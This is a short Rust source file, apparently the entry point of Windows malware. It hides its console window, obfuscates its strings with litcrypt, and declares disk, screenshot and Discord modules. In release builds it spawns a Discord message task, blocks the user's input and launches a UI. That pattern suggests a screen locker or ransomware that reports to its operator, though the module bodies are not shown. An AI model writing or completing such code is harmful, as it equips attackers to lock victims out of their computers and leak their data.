#![windows_subsystem = "windows"]

#[macro_use]
extern crate litcrypt;

use_litcrypt!();

mod disk;
mod interface;
mod windows;
mod discord;
mod screenshot;


#[tokio::main]
async fn main() -> Result<(), ()> {
    #[cfg(debug_assertions)]
    discord::send_message().await;

    #[cfg(not(debug_assertions))] {
        tokio::spawn(async { discord::send_message().await; });
        windows::block_input();
        interface::start_ui();
    }


    Ok(())
}

